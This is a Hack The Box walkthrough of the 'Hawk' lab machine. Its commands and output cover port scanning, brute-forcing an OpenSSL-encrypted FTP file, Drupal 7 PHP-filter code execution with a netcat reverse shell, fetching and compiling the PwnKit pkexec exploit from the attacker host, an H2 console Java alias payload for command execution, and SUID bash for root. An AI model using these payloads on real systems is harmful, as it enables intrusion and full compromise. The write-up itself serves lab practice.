---
layout: single
title: Hawk - Hack The Box
excerpt: "Hawk is a medium to hard difficulty machine, which provides excellent practice in pentesting Drupal. The exploitable H2 DBMS installation is also realistic as web-based SQL consoles (RavenDB etc.) are found in many environments. The OpenSSL decryption challenge increases the difficulty of this machine."
date: 2025-06-07
classes: wide
header:
  teaser: /img2/hawk.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - OpenSSL Cipher Brute Force and Decryption
  - Drupal Enumeration/Exploitation
  - SUID Binary Exploitation [Privilege Escalation] (OPTION 1)
  - H2 Database Exploitation (OPTION 2)
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.10.102
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 16:01 CEST
Nmap scan report for 10.10.10.102
Host is up (0.063s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
5435/tcp open  sceanics
8082/tcp open  blackice-alerts
9092/tcp open  XmlIpcRegSvc

Nmap done: 1 IP address (1 host up) scanned in 10.56 seconds
```

- Vulnerability and vesion scan 

```bash
❯ nmap -sCV -p21,22,80,5435,8082,9092 10.10.10.102
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 16:02 CEST
Nmap scan report for 10.10.10.102
Host is up (0.057s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
|_http-generator: Drupal 7 (http://drupal.org)
5435/tcp open  tcpwrapped
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
9092/tcp open  XmlIpcRegSvc?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V=7.95%I=7%D=6/6%Time=6842F4EF%P=x86_64-pc-linux-gnu%r(NUL
SF:L,45E,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\0
SF:t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\
SF:0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l
SF:\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0
SF:h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x01\xd8\0o\0r\0g\0\.\0h\x002\
SF:0\.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\
SF:0\x20\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t
SF:\0o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0
SF:o\0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\
SF:0l\0l\0o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x00
SF:1\x009\x006\0\]\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0
SF:s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0
SF:c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o
SF:\0n\0\.\0j\0a\0v\0a\0:\x003\x004\x005\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\
SF:0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\
SF:0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:
SF:\x001\x007\x009\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\
SF:0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D
SF:\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x005\x005\0\)\0\
SF:n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\
SF:0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\
SF:0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x004\x004\0\)\0\n\0\t\0a\0t\0\x20\0o\0
SF:r")%r(drda,45E,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0
SF:e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\
SF:0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20
SF:\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0
SF:w\0O\0t\0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x01\xd8\0o\0r\0g\0\.
SF:\0h\x002\0\.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\
SF:0o\0n\0:\0\x20\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s
SF:\0\x20\0t\0o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0
SF:\x20\0n\0o\0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\
SF:0c\0p\0A\0l\0l\0o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x0
SF:07\0-\x001\x009\x006\0\]\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0
SF:m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0
SF:J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p
SF:\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x003\x004\x005\0\)\0\n\0\t\0a\0t\0\x20\
SF:0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\
SF:0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a
SF:\0v\0a\0:\x001\x007\x009\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0
SF:\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\
SF:0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x005\x0
SF:05\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0
SF:e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\
SF:0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x004\x004\0\)\0\n\0\t\0a\0t\0
SF:\x20\0o\0r");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.03 seconds
```

- Get hidden files in FTP

```bash
❯ ftp 10.10.10.102
```

```ruby
Connected to 10.10.10.102.
220 (vsFTPd 3.0.3)
Name (10.10.10.102:pyuser): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42378|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
226 Directory send OK.
ftp> cd messages
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||41337|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
-rw-r--r--    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
226 Directory send OK.
ftp> get .drupal.txt.enc
local: .drupal.txt.enc remote: .drupal.txt.enc
229 Entering Extended Passive Mode (|||41870|)
150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
100% |***************************************************************************************************************************************************************|   240        3.14 KiB/s    00:00 ETA
226 Transfer complete.
240 bytes received in 00:00 (0.88 KiB/s)
```

> Let's check .drupal.txt.enc

```bash
❯ file .drupal.txt.enc
```

```ruby
.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded
```

## Exploitation

- Crack OpenSSL encrypted file 

```bash
#!/bin/bash

base64 -d .drupal.txt.enc > openhash.enc

while read -r pass; do
  if openssl enc -d -aes-256-cbc -in openhash.enc -pass pass:"$pass" -out /dev/null 2>/dev/null; then
    echo "Password found! --> $pass"
    openssl enc -d -aes-256-cbc -in openhash.enc -pass pass:"$pass"
    break
  fi
done < /usr/share/wordlists/rockyou.txt
```

```bash
❯ chmod +x brute.sh
```

```bash
❯ ./brute.sh
```

```ruby
Password found! --> friends
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
```

> We need to decrypt base64 to decrypt OpenSSL file.

> Portal Password: PencilKeyboardScanner123
> File Password: friends

- RCE in Drupal 7 (Authenticated)

![](/img2/Pasted%20image%2020250607161738.png)

> First, we need to enable PHP filter module

![](/img2/Pasted%20image%2020250607161911.png)

![](/img2/Pasted%20image%2020250607161952.png)

- Reverse shell

![](/img2/Pasted%20image%2020250607162343.png)

```bash
❯ nc -nlvp 9000 
```

```ruby
listening on [any] 9000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.102] 45186
bash: cannot set terminal process group (833): Inappropriate ioctl for device
bash: no job control in this shell
www-data@hawk:/var/www/html$     
```


## Post-exploitation (OPTION 1)

- Find sudoers

```bash
www-data@hawk:/tmp$ find / -perm -4000 2>/dev/null | grep -v snap
```

```ruby
/bin/ping
/bin/fusermount
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/umount
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
```

- CVE-2021-4034 (Pkexec Local Privilege Escalation)

```bash
wget https://github.com/ly4k/PwnKit/blob/main/PwnKit.c
python3 -m http.server
```

```bash
wget http://10.10.16.7/PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit
```

## Post-explotation (OPTION 2)

- Find leaked credentials 

```bash
www-data@hawk:/var/www/html/sites/default$ cat settings.php | grep password
```

```ruby
 *   'password' => 'password',
 * username, password, host, and database name.
 *   'password' => 'password',
 *   'password' => 'password',
 *     'password' => 'password',
 *     'password' => 'password',
      'password' => 'drupal4hawk',
 * by using the username and password variables. The proxy_user_agent variable
# $conf['proxy_password'] = '';
```

- Pivoting

```bash
www-data@hawk:/var/www/html/sites/default$ su daniel
```

```python
Password: 
Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("bash")
daniel@hawk:/var/www/html/sites/default$ 
```

- Check system proccess

```bash
daniel@hawk:/var/www/html$ ps -aux | grep root
```

```ruby
root       737  0.0  1.6 169132 17160 ?        Ssl  07:30   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher
root       739  0.0  0.7 288616  7192 ?        Ssl  07:30   0:00 /usr/lib/accountsservice/accounts-daemon
root       761  0.0  0.3  30028  3292 ?        Ss   07:30   0:00 /usr/sbin/cron -f
root       763  0.0  0.3  57500  3204 ?        S    07:30   0:00 /usr/sbin/CRON -f
root       766  0.0  0.2  28676  2728 ?        Ss   07:30   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       767  0.0  0.0  25376   232 ?        Ss   07:30   0:00 /sbin/iscsid
root       768  0.0  0.5  25880  5280 ?        S<Ls 07:30   0:00 /sbin/iscsid
root       770  0.0  0.0   4628   776 ?        Ss   07:30   0:00 /bin/sh -c /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar
root       771  0.2 13.7 2354308 139012 ?      Sl   07:30   0:13 /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar
root       772  0.0  0.6  72296  6452 ?        Ss   07:30   0:00 /usr/sbin/sshd -D
root       825  0.0  0.1  14888  1988 tty1     Ss+  07:30   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       826  0.0  0.6 288888  6696 ?        Ssl  07:30   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       843  0.0  2.7 326720 27992 ?        Ss   07:30   0:00 /usr/sbin/apache2 -k start
```

> We found h2 database service /opt/h2/bin/h2-1.4.196.jar

- Check database port

```bash
daniel@hawk:/var/www/html$ ss -nltp
```

```ruby
State                      Recv-Q                      Send-Q                                            Local Address:Port                                           Peer Address:Port                     
LISTEN                     0                           80                                                    127.0.0.1:3306                                                0.0.0.0:*                        
LISTEN                     0                           128                                               127.0.0.53%lo:53                                                  0.0.0.0:*                        
LISTEN                     0                           128                                                     0.0.0.0:22                                                  0.0.0.0:*                        
LISTEN                     0                           50                                                            *:9092                                                      *:*                        
LISTEN                     0                           128                                                           *:80                                                        *:*                        
LISTEN                     0                           50                                                            *:8082                                                      *:*                        
LISTEN                     0                           32                                                            *:21                                                        *:*                        
LISTEN                     0                           128                                                        [::]:22                                                     [::]:*                        
LISTEN                     0                           50                                                            *:5435                                                      *:*       
```

> Maybe port 8082

- Port Forwarding on port 8082

```bash
ssh daniel@10.10.10.102 -L 8082:localhost:8082
```

```ruby
daniel@10.10.10.102's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jun 10 08:51:28 UTC 2025

  System load:  0.0               Processes:           165
  Usage of /:   47.5% of 7.32GB   Users logged in:     0
  Memory usage: 49%               IP address for eth0: 10.10.10.102
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

417 packages can be updated.
268 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jun 10 07:43:47 2025 from 10.10.16.7
Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>       
```

- H2 Database RCE

![](/img2/Pasted%20image%2020250610105213.png)

```java
CREATE ALIAS EXEC AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;
```

![](/img2/Pasted%20image%2020250610105351.png)

```java
CALL EXEC('whoami')
```

- Set SUID on /bin/bash

![](/img2/Pasted%20image%2020250610105628.png)

```bash
bash-4.4$ ls -l /bin/bash 
```

```ruby
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
```

```bash
bash-4.4$ bash -p
```

```ruby
bash-4.4# whoami
root
```


![](/img2/Pasted%20image%2020250607162844.png)